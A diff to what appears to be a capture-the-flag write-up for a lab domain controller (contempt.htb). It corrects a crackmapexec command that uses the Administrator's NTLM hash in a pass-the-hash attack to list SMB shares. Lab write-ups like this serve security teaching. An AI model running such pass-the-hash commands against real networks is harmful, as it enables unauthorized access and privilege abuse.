@@ -159,7 +159,7 @@ We now have all the hashes, we can impersonate anyone we want using pass-the-has
 Let's grab the most privileged user : Administrator. Since I didn't saw the WinRM port at the first time, we need to enumerate the SMB shares in order to see if we have access to `C$`.
 
 ```bash
-crackmapexec smb dc01.contempt.htb -d 'contempt.htb' -u 'Administrator' -H '8845ad387f66869ab9768c8a7b08b36f' -h
+crackmapexec smb dc01.contempt.htb -d 'contempt.htb' -u 'Administrator' -H '8845ad387f66869ab9768c8a7b08b36f' --shares
 ```
 
 ![](https://i.imgur.com/d5hR7ec.png)
